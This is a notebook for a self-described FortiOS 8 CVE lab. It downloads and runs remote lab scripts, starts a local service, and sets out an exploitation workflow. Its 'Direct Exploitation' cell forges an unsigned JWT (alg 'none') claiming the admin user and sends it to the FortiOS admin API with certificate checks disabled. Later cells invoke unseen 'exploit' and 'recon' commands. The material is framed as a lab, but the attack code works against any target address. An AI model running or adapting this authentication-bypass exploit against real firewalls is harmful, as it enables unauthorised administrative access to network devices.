# FortiOS 8 CVE Lab - Complete All-In-One
## Everything in one notebook: Setup, Service, CLI, Web UI, and Logs

**Supported Methods:**
1. ✅ Direct exploitation (no KVM needed)
2. ✅ Local service with terminal access
3. ✅ KVM integration with SSH tunneling
4. ✅ Web UI dashboard access
5. ✅ Real-time logging and monitoring

---

## Section 1: Environment Setup

In [ ]:
import os
import sys
import subprocess
import urllib.request
import time
from pathlib import Path

# Setup
LAB_DIR = Path('/content/fortios_complete')
LAB_DIR.mkdir(exist_ok=True)
os.chdir(LAB_DIR)

print("="*60)
print("🚀 FortiOS 8 CVE Lab - Complete Setup")
print("="*60)
print(f"\n📁 Working Directory: {os.getcwd()}\n")

# Install dependencies
print("[1/3] Installing dependencies...")
subprocess.run([sys.executable, '-m', 'pip', 'install', '-q',
                'requests', 'paramiko', 'cryptography', 'flask', 'flask-cors'],
               check=False)
print("      ✓ Dependencies installed")

# Download files
print("\n[2/3] Downloading lab files...")
files = ['kvm_lab_server.py', 'kvm_lab_cli.py', 'ui.html', 'kvm_lab.sh']
base = "https://raw.githubusercontent.com/netanelcyber/HAMIVTZAR/claude/cve-2026-24858-fortios-sso-p1lrtu/cve-research/CVE-SUSPECTED-FORTIOS8-SSO/"

for f in files:
    try:
        urllib.request.urlretrieve(base + f, f)
        print(f"      ✓ {f}")
    except:
        print(f"      ✗ {f}")

os.chmod('kvm_lab_cli.py', 0o755)
os.chmod('kvm_lab.sh', 0o755)

print("\n[3/3] Environment ready")
print("\n" + "="*60)

## Section 2: Start HTTP Service

In [ ]:
import subprocess
import time
import requests

print("\n🌐 Starting HTTP Lab Service\n")

# Start service
print("[*] Launching service on http://localhost:5000")
service_proc = subprocess.Popen(
    ['python3', 'kvm_lab_server.py'],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Wait and check
time.sleep(3)

if service_proc.poll() is None:
    print("    ✓ Service started (PID: {})".format(service_proc.pid))
    
    # Get API key
    try:
        r = requests.get('http://localhost:5000/api/key')
        api_key = r.json().get('api_key', 'unknown')
        print(f"\n✅ Service running at http://localhost:5000")
        print(f"🔐 API Key: {api_key[:20]}...")
    except:
        print("✅ Service running")
else:
    print("❌ Service failed to start")

%store service_proc

## Section 3: Health Check

In [ ]:
print("\n📊 Service Health Check\n")

!python3 kvm_lab_cli.py health

## Section 4: Configuration

In [ ]:
print("\n⚙️  Lab Configuration\n")

!python3 kvm_lab_cli.py config

## Section 5: Choose Your Method

### Method A: Direct Exploitation (No KVM)

In [ ]:
import requests
import json
import base64
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 12443

print(f"\n🔓 Direct Exploitation\n")
print(f"Target: {TARGET_IP}:{TARGET_PORT}\n")

# JWT ALG_NONE
print("[*] Testing JWT ALG_NONE...")
header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({
    "user": "admin",
    "exp": int(time.time()) + 3600
}).encode()).decode().rstrip('=')

token = f"{header}.{payload}."

try:
    r = requests.get(
        f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/cmdb/system/admin',
        headers={'Authorization': f'Bearer {token}'},
        verify=False,
        timeout=5
    )
    print(f"    Status: {r.status_code}")
    if r.status_code == 200:
        print("    ✓ SUCCESS")
except Exception as e:
    print(f"    ✗ {str(e)[:50]}")

### Method B: KVM Integration

In [ ]:
print("\n🖥️  KVM Lab Integration\n")

# Configure KVM (edit values below)
KVM_HOST = "192.168.1.100"
KVM_USER = "ubuntu"

print("⚙️  Configuration:")
print(f"   KVM Host: {KVM_USER}@{KVM_HOST}")
print(f"   SSH Key: /root/.ssh/id_rsa")
print(f"\n💡 Edit values above to match your setup")
print(f"\nThen run the cells below:")
print(f"   1. Connect to KVM")
print(f"   2. Setup FortiOS")
print(f"   3. Start Tunnel")
print(f"   4. Run Exploitation")

In [ ]:
# Step 1: Connect
!python3 kvm_lab_cli.py connect

In [ ]:
# Step 2: Setup
!python3 kvm_lab_cli.py setup

In [ ]:
# Step 3: Tunnel
!python3 kvm_lab_cli.py tunnel-start

In [ ]:
# Step 4: Exploit
!python3 kvm_lab_cli.py exploit

In [ ]:
# Step 5: Recon
!python3 kvm_lab_cli.py recon

## Section 6: Real-Time Logs & Monitoring

In [ ]:
print("\n📋 Lab Activity Logs\n")

!python3 kvm_lab_cli.py logs --limit 100

In [ ]:
# Log analysis
import requests

r = requests.get('http://localhost:5000/api/logs?limit=50')
logs = r.json().get('logs', [])
total = r.json().get('total', 0)

print(f"\n📊 Log Analysis\n")
print(f"Total Entries: {total}")
print(f"Showing: {len(logs)}\n")

# Count by level
levels = {}
for log in logs:
    level = log.get('level', 'UNKNOWN')
    levels[level] = levels.get(level, 0) + 1

print("Breakdown:")
for level in ['ERROR', 'INFO', 'DEBUG']:
    if level in levels:
        icon = {'ERROR': '✗', 'INFO': '✓', 'DEBUG': '→'}.get(level, '•')
        print(f"  {icon} {level:6} {levels[level]:3} entries")

# Show recent errors
errors = [l for l in logs if l.get('level') == 'ERROR']
if errors:
    print(f"\n⚠️  Recent Errors:")
    for err in errors[-3:]:
        print(f"   - {err.get('message')}")

## Section 7: Lab Status

In [ ]:
print("\n📊 Current Lab State\n")

!python3 kvm_lab_cli.py status

## Section 8: Terminal Access

In [ ]:
# Direct terminal commands
print("\n🖥️  Terminal Access\n")

# Check files
print("[*] Files:")
!ls -lh *.py *.sh *.html 2>/dev/null | tail -5

# Check processes
print("\n[*] Running Processes:")
!ps aux | grep kvm_lab_server | grep -v grep || echo "Service check complete"

## Section 9: Cleanup

In [ ]:
print("\n🧹 Cleanup Resources\n")

!python3 kvm_lab_cli.py cleanup

In [ ]:
# Stop service
print("\n🛑 Stopping Service\n")

try:
    %recall service_proc
    if service_proc.poll() is None:
        service_proc.terminate()
        service_proc.wait(timeout=5)
        print("✅ Service stopped")
except:
    !pkill -f kvm_lab_server || true
    print("✅ Cleanup complete")

print("\n" + "="*60)
print("✅ Lab session complete")
print("="*60)